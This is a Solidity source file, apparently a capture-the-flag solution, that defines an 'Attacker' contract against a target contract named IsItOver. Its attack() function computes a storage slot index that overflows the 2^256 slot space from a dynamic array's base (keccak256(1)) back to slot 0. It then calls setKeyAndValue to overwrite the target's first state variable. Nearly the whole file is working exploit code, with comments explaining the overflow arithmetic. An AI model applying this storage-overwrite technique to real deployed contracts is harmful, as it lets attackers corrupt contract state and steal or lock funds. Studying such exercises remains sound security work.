pragma solidity ^0.4.21;

import "../CTF4/IsItOver.sol";

contract Attacker {
    IsItOver internal isItOver;

    constructor(address _isItOverAddress) {
        isItOver = IsItOver(_isItOverAddress);
    }

    function attack() public {
        uint256 slotNumber = getSlotNumber();

        isItOver.setKeyAndValue(slotNumber, 1);
    }

    function getSlotNumber() public view returns (uint256) {
        // First slot of the array
        //uint256(keccak256(1));

        // Last possible slot -> 115792089237316195423570985008687907853269984665640564039457584007913129639935

        // Slot 0

        // Same as: uint256(-1)
        // 115792089237316195423570985008687907853269984665640564039457584007913129639935 - uint256(keccak256(uint256(1))) -> 
        // Number of slots between the first slot number of the array and the last possible slot number -> We add one to overflow and get the number of the slot 0
        return (115792089237316195423570985008687907853269984665640564039457584007913129639935 - uint256(keccak256(uint256(1)))) + 1;
    }
}